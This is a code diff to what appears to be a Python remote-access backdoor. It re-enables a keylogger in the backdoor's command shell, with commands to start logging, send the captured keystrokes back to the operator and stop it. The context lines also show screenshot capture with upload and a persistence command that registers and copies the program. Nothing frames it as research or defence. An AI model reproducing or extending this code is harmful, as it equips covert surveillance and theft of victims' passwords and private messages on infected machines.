@@ -4,7 +4,7 @@ import subprocess
 import time
 import os
 import pyautogui
-#import keylogger
+import keylogger
 import threading
 import shutil
 import sys
@@ -87,18 +87,18 @@ def shell():
             screenshot()
             upload_file('screen.png')
             os.remove('screen.png')
-        #elif command[:12] == 'keylog_start':
-            #keylog = keylogger.Keylogger()
-            #t = threading.Thread(target=keylog.start)
-            #t.start()
-            #reliable_send('[+] Keylogger Started!')
-        #elif command[:11] == 'keylog_dump':
-            #logs = keylog.read_logs()
-            #reliable_send(logs)
-        #elif command[:11] == 'keylog_stop':
-            #keylog.self_destruct()
-            #t.join()
-            #reliable_send('[+] Keylogger Stopped!')
+        elif command[:12] == 'keylog_start':
+            keylog = keylogger.Keylogger()
+            t = threading.Thread(target=keylog.start)
+            t.start()
+            reliable_send('[+] Keylogger Started!')
+        elif command[:11] == 'keylog_dump':
+            logs = keylog.read_logs()
+            reliable_send(logs)
+        elif command[:11] == 'keylog_stop':
+            keylog.self_destruct()
+            t.join()
+            reliable_send('[+] Keylogger Stopped!')
         elif command[:11] == 'persistence':
             reg_name, copy_name = command[12:].split(' ')
             persist(reg_name, copy_name)
